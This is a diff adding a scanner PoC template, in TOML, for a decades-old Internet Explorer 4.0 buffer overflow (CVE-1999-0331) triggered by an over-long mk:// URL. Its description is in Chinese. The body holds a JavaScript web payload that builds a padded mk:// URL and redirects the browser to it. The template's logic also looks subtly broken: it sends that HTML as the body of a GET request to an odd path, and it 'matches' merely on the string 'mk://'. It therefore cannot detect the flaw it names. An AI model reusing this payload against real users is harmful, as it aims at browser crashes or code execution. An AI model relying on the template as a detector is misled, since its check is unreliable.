@@ -1,0 +1,29 @@
+[info]
+author = "AVE"
+description = "Microsoft Internet Explorer 4.0/4.0.1 存在缓冲区溢出漏洞。远程攻击者可通过构造包含超长 mk:// 协议 URL 的恶意网页，诱骗用户访问后触发缓冲区溢出，导致浏览器崩溃或在当前用户上下文中执行任意代码。"
+id = "POC-AVE-1999-0547"
+name = "Microsoft Internet Explorer 4.0 mk:// URL Buffer Overflow PoC"
+severity = "high"
+tags = ["ave-1999-0547"]
+vuln_id = [
+    "CVE-1999-0331",
+    "AVE-1999-0547",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = '<html><body><script>var x="mk://";for(var i=0;i<200;i++){x+="A";}location.href=x;</script></body></html>'
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["mk://"]
